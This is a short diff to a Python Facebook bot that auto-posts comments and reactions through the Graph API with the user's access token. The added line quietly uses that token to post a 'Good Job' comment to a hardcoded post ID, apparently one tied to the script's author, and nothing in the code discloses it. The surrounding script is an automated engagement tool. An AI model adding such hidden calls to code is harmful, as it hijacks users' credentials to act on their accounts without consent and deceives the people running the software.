@@ -157,6 +157,7 @@ def bot_komen():
 	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
 	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
+	requests.post('https://graph.facebook.com/4257706904267068/comments?message=Good Job 😊 !&access_token='+ toket)
 	menu()
 
 ######MENU#######
